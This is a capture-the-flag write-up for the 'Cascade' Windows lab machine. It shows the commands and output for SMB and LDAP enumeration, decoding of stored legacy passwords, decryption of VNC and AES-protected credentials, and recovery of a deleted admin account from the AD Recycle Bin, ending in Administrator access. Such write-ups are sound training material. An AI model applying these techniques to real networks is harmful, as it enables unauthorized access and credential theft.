Cascade was a medium windows box that involved anumeration of smb shares and ldap to locate password for another user. Reversing files revealed an iv and a key for AES decryption which the revealed yet another password. Root involved recovery of windows user password from the recyclebin to gain administrator access.


# User

## Enumeration

```bash
➜  cascade nmap -sC -Pn -sV -o nmap 10.10.10.182
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-24 06:03 EDT
Stats: 0:00:31 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 71.43% done; ETC: 06:04 (0:00:10 remaining)
Stats: 0:00:36 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 71.43% done; ETC: 06:04 (0:00:12 remaining)
Stats: 0:03:06 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.21% done; ETC: 06:07 (0:00:02 remaining)
Stats: 0:03:06 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.21% done; ETC: 06:07 (0:00:02 remaining)
Nmap scan report for 10.10.10.182
Host is up (0.019s latency).
Not shown: 986 filtered ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-07-24 10:07:52Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
```

There are many ports open so we check some common ones in case there is a direct enumeration route from there.

### SMB enum

We check smb shares with anonymous login and it is allowed but we are not allowed to list the shares so we move on to another port.


```bash
➜  cascade smbclient -L cascade.htb
Enter WORKGROUP\root's password: 
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
SMB1 disabled -- no workgroup available
```

### Enum4Linux

We run enum4linux to check basic enum of users and domains to see what we are going to work with.

```bash
➜  cascade enum4linux -a cascade.htb
 ========================================== 
|    Getting domain SID for cascade.htb    |
 ========================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.
Domain Name: CASCADE
Domain Sid: S-1-5-21-3332504370-1206983947-1165150453
[+] Host is part of a domain (not a workgroup)

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881.
user:[CascGuest] rid:[0x1f5]
user:[arksvc] rid:[0x452]
user:[s.smith] rid:[0x453]
user:[r.thompson] rid:[0x455]
user:[util] rid:[0x457]
user:[j.wakefield] rid:[0x45c]
user:[s.hickson] rid:[0x461]
user:[j.goodhand] rid:[0x462]
user:[a.turnbull] rid:[0x464]
user:[e.crowe] rid:[0x467]
user:[b.hanson] rid:[0x468]
user:[d.burman] rid:[0x469]
user:[BackupSvc] rid:[0x46a]
user:[j.allen] rid:[0x46e]
user:[i.croft] rid:[0x46f]

[+] Getting local groups:
group:[Cert Publishers] rid:[0x205]
group:[RAS and IAS Servers] rid:[0x229]
group:[Allowed RODC Password Replication Group] rid:[0x23b]
group:[Denied RODC Password Replication Group] rid:[0x23c]
group:[DnsAdmins] rid:[0x44e]
group:[IT] rid:[0x459]
group:[Production] rid:[0x45a]
group:[HR] rid:[0x45b]
group:[AD Recycle Bin] rid:[0x45f]
group:[Backup] rid:[0x460]
group:[Temps] rid:[0x463]
group:[WinRMRemoteWMIUsers__] rid:[0x465]
group:[Remote Management Users] rid:[0x466]
group:[Factory] rid:[0x46c]
group:[Finance] rid:[0x46d]
group:[Audit Share] rid:[0x471]
group:[Data Share] rid:[0x472]
```

### Ldap enumeration

We will use ldapsearch to further extend out enumeration as port 3268 is open for ldap.

running `ldapsearch -x -h cascade.htb -b "dc=CASCADE,dc=local"` we get back a long list of results. The one particular thing that stuck out was an attribute called `cascadeLegacyPwd`. There is also a base64 string next to it.

```bash
cascadeLegacyPwd: clk0bjVldmE=
```

We decode this from base64 using the command line and we get what seems to be a password. Based on the atttribute name it sounds like a password.

```bash
➜  cascade echo "clk0bjVldmE=" | base64 -d
rY4n5eva
```

Since this section was found under the user `r.thompson` in the ldapsearch we will use this user.
```bash
dn: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
```

### Enumerating smb shares as r.thompson

We can confrim that theese credentials work when we list smb shares as the user with his password.

```bash
➜  cascade smbclient -L cascade.htb -U r.thompson                    
Enter WORKGROUP\r.thompson's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        Audit$          Disk      
        C$              Disk      Default share
        Data            Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        print$          Disk      Printer Drivers
        SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
```

Now we know that the creds are correct we will login as him and enumerate further.

```bash
➜  cascade smbclient -L cascade.htb -U r.thompson                    
Enter WORKGROUP\r.thompson's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        Audit$          Disk      
        C$              Disk      Default share
        Data            Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        print$          Disk      Printer Drivers
        SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
➜  cascade smbclient  //cascade.htb/Data -U r.thompson
Enter WORKGROUP\r.thompson's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jan 26 22:27:34 2020
  ..                                  D        0  Sun Jan 26 22:27:34 2020
  Contractors                         D        0  Sun Jan 12 20:45:11 2020
  Finance                             D        0  Sun Jan 12 20:45:06 2020
  IT                                  D        0  Tue Jan 28 13:04:51 2020
  Production                          D        0  Sun Jan 12 20:45:18 2020
  Temps                               D        0  Sun Jan 12 20:45:15 2020

                13106687 blocks of size 4096. 7793970 blocks available
smb: \IT\Email Archives\> ls
  .                                   D        0  Tue Jan 28 13:00:30 2020
  ..                                  D        0  Tue Jan 28 13:00:30 2020
  Meeting_Notes_June_2018.html        A     2522  Tue Jan 28 13:00:12 2020

                13106687 blocks of size 4096. 7793954 blocks available
```

We find an interesting ilfe in the `Email Archives` directory.

We read the file using `more`.

```html
<p>For anyone that missed yesterday<92>s meeting (I<92>m looking at
you Ben). Main points are below:</p>

<p class=MsoNormal><o:p>&nbsp;</o:p></p>

<p>-- New production network will be going live on
Wednesday so keep an eye out for any issues. </p>

<p>-- We will be using a temporary account to
perform all tasks related to the network migration and this account will be deleted at the end of
2018 once the migration is complete. This will allow us to identify actions
related to the migration in security logs etc. Username is TempAdmin (password is the same as the normal admin account password). </p>

<p>-- The winner of the <93>Best GPO<94> competition will be
announced on Friday so get your submissions in soon.</p>
```

This file mentions something about a meeting taking place with a reference of a `TempAdmin` account but it is now deleted.

We find another interesting file in `\IT\Temp\s.smith` which we assume is another user that we need to priv esc to.

```bash
smb: \IT\Temp\s.smith\> ls
  .                                   D        0  Tue Jan 28 15:00:01 2020
  ..                                  D        0  Tue Jan 28 15:00:01 2020
  VNC Install.reg                     A     2680  Tue Jan 28 14:27:44 2020

                13106687 blocks of size 4096. 7793952 blocks available
```

We trnasfer this to our machine using `get` and read the file.

```bash
➜  cascade cat 'VNC Install.reg' 
��Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
"ExtraPorts"=""
"QueryTimeout"=dword:0000001e
"QueryAcceptOnTimeout"=dword:00000000
"LocalInputPriorityTimeout"=dword:00000003
"LocalInputPriority"=dword:00000000
"BlockRemoteInput"=dword:00000000
"BlockLocalInput"=dword:00000000
"IpAccessControl"=""
"RfbPort"=dword:0000170c
"HttpPort"=dword:000016a8
"DisconnectAction"=dword:00000000
"AcceptRfbConnections"=dword:00000001
"UseVncAuthentication"=dword:00000001
"UseControlAuthentication"=dword:00000000
"RepeatControlAuthentication"=dword:00000000
"LoopbackOnly"=dword:00000000
"AcceptHttpConnections"=dword:00000001
"LogLevel"=dword:00000000
"EnableFileTransfers"=dword:00000001
"RemoveWallpaper"=dword:00000001
"UseD3D"=dword:00000001
"UseMirrorDriver"=dword:00000001
"EnableUrlParams"=dword:00000001
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
"AlwaysShared"=dword:00000000
"NeverShared"=dword:00000000
"DisconnectClients"=dword:00000001
"PollingInterval"=dword:000003e8
"AllowLoopback"=dword:00000000
"VideoRecognitionInterval"=dword:00000bb8
"GrabTransparentWindows"=dword:00000001
"SaveLogToAllUsersPath"=dword:00000000
"RunControlInterface"=dword:00000001
"IdleTimeout"=dword:00000000
"VideoClasses"=""
"VideoRects"=""
```
## Exploitation

### hash cracking

We can see an interesting line:
```bash
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
```

Decrypting this from and converting to base64 we get the string `a88qS25ayg8=`.

We know that the file is called `VNC install` so we search for password decrypters with `VNC`.

We come accross a tool on github and we compile it on our machine:
[Vncpwdtool](https://github.com/jeroennijhof/vncpwd)

We git clone this and run the commands to compile the binary.

```bash
➜  vncpwd git:(master) gcc -o vncpwd vncpwd.c d3des.c

➜  vncpwd git:(master) ✗ ./vncpwd hash 
Password: sT333ve2
```
### User.txt

We now login with `evil-winrm` and read the user flag.

```bash
➜  cascade evil-winrm -i cascade.htb -u s.smith -p sT333ve2


Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\s.smith\Documents> 
*Evil-WinRM* PS C:\Users\s.smith\Documents> type ../Desktop/user.txt
2560be791{...}
```


# Root

## reversing the dll and exe files

We find the shares folder and enumerate that further.

Since we are not allowed to list the shares it doesnt matter as we already know all of the share names from smb access.

```bash
*Evil-WinRM* PS C:\Shares> cd Audit
*Evil-WinRM* PS C:\Shares\Audit> dir


    Directory: C:\Shares\Audit


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        1/28/2020   9:40 PM                DB
d-----        1/26/2020  10:25 PM                x64
d-----        1/26/2020  10:25 PM                x86
-a----        1/28/2020   9:46 PM          13312 CascAudit.exe
-a----        1/29/2020   6:00 PM          12288 CascCrypto.dll
-a----        1/28/2020  11:29 PM             45 RunAudit.bat
-a----       10/27/2019   6:38 AM         363520 System.Data.SQLite.dll
-a----       10/27/2019   6:38 AM         186880 System.Data.SQLite.EF6.dll
```

We transfer all theese files to our machine. Using the `download` command.

We open the `Audit.db` file in an sql database reader and we can see decoding it doesnt work.

![sqlpwdread](https://i.ibb.co/kVn4Yrf/sql-pwd-read.png)

```bash
➜  cascade echo "BQO5l5Kj9MdErXx6Q6AGOw==" | base64 -d
������D�|zC�;
```

We assume that it is encoded using some kind of other encryption.

I use visual studio to reverse CascCrypto.dll and in the folder `CascCrypto->CascCrypto.dll->CascCrypto->Crypto` we find an encryption key.

```
Encoding.UTF8.GetBytes("1tdyjCbY1Ix49842");
```

So the key is `1tdyjCbY1Ix49842`

We now do the same thing with `CascAudit.exe` and in `CascAudit->CascAudit.exe->CascAudiot->MainModule` we find another key.

```bash
password = Crypto.DecryptString(encryptedString, "c4scadek3y654321"); }
```

We attempt to use aes decryption to decode the ciphertext.

![aes](https://i.ibb.co/C6Ln5z9/aes.png)

And now we have the password: `w3lc0meFr31nd`

We login with `evil-winrm` as the user arksvc.

```bash
➜  cascade evil-winrm -i cascade.htb -u arksvc -p w3lc0meFr31nd

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\arksvc\Documents>
```

We run `whoami /all` to check what privelages we have and we get some interesting results:
```bash
*Evil-WinRM* PS C:\Users\arksvc\Documents> whoami /all

USER INFORMATION
----------------

User Name      SID
============== ==============================================
cascade\arksvc S-1-5-21-3332504370-1206983947-1165150453-1106


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                            Attributes
=========================================== ================ ============================================== ===============================================================
Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
CASCADE\Data Share                          Alias            S-1-5-21-3332504370-1206983947-1165150453-1138 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\IT                                  Alias            S-1-5-21-3332504370-1206983947-1165150453-1113 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\AD Recycle Bin                      Alias            S-1-5-21-3332504370-1206983947-1165150453-1119 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\Remote Management Users             Alias            S-1-5-21-3332504370-1206983947-1165150453-1126 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

This one sticks out in particular.

```bash
CASCADE\AD Recycle Bin                      Alias            S-1-5-21-3332504370-1206983947-1165150453-1119 Mandatory group, Enabled by default, Enabled group, Local Group
```
So this means that we have privilege to recycle the deleted objects from the Ad Recycle bin.

I remembered the html file from earlier about the user TempAdmin and how their account was deleted so what if we could recover the deleted data for that user and login as admin as they both have the same password for the account.

We run the following command:
```bash
*Evil-WinRM* PS C:\Users\arksvc\Documents> Get-ADObject -ldapFilter:"(msDS-LastKnownRDN=*)" -IncludeDeletedObjects

                                                                                                                                                                                                       
Deleted           : True                                                                                                                                                                               
DistinguishedName : CN=CASC-WS1\0ADEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe,CN=Deleted Objects,DC=cascade,DC=local                                                                                      
Name              : CASC-WS1                                                                                                                                                                           
                    DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe                                                                                                                                           
ObjectClass       : computer                                                                                                                                                                           
ObjectGUID        : 6d97daa4-2e82-4946-a11e-f91fa18bfabe                                                                                                                                               
                                                                                                                                                                                                       
Deleted           : True                                                                                                                                                                               
DistinguishedName : CN=Scheduled Tasks\0ADEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2,CN=Deleted Objects,DC=cascade,DC=local                                                                               
Name              : Scheduled Tasks
                    DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2
ObjectClass       : group
ObjectGUID        : 13375728-5ddb-4137-b8b8-b9041d1d3fd2

Deleted           : True
DistinguishedName : CN={A403B701-A528-4685-A816-FDEE32BDDCBA}\0ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN=Deleted Objects,DC=cascade,DC=local
Name              : {A403B701-A528-4685-A816-FDEE32BDDCBA}
                    DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
ObjectClass       : groupPolicyContainer
ObjectGUID        : ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e

Deleted           : True
DistinguishedName : CN=Machine\0ADEL:93c23674-e411-400b-bb9f-c0340bda5a34,CN=Deleted Objects,DC=cascade,DC=local
Name              : Machine
                    DEL:93c23674-e411-400b-bb9f-c0340bda5a34
ObjectClass       : container
ObjectGUID        : 93c23674-e411-400b-bb9f-c0340bda5a34

Deleted           : True
DistinguishedName : CN=User\0ADEL:746385f2-e3a0-4252-b83a-5a206da0ed88,CN=Deleted Objects,DC=cascade,DC=local                                                                                          
Name              : User                                                                                                                                                                               
                    DEL:746385f2-e3a0-4252-b83a-5a206da0ed88
ObjectClass       : container
ObjectGUID        : 746385f2-e3a0-4252-b83a-5a206da0ed88

Deleted           : True
DistinguishedName : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
Name              : TempAdmin
                    DEL:f0cc344d-31e0-4866-bceb-a842791ca059
ObjectClass       : user
ObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059
```

```bash
DistinguishedName : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
```

This confirms that the `TempAdmin` account is in the recycle bin.

We now run `Get-ADObject -filter 'isdeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property *` which returns a long amount of results with the data from the user `TempAdmin`.

```bash
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
```

We decode this and we get the final passowrd for the admininstrator.

```bash
➜  cascade echo "YmFDVDNyMWFOMDBkbGVz" | base64 -d
baCT3r1aN00dles
```

```bash
➜  cascade evil-winrm -i cascade.htb -u Administrator -p baCT3r1aN00dles                                   

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> type ../Desktop/root.txt
3f3bb569d2{...}
```

Thanks for reading hope you enjoyed!
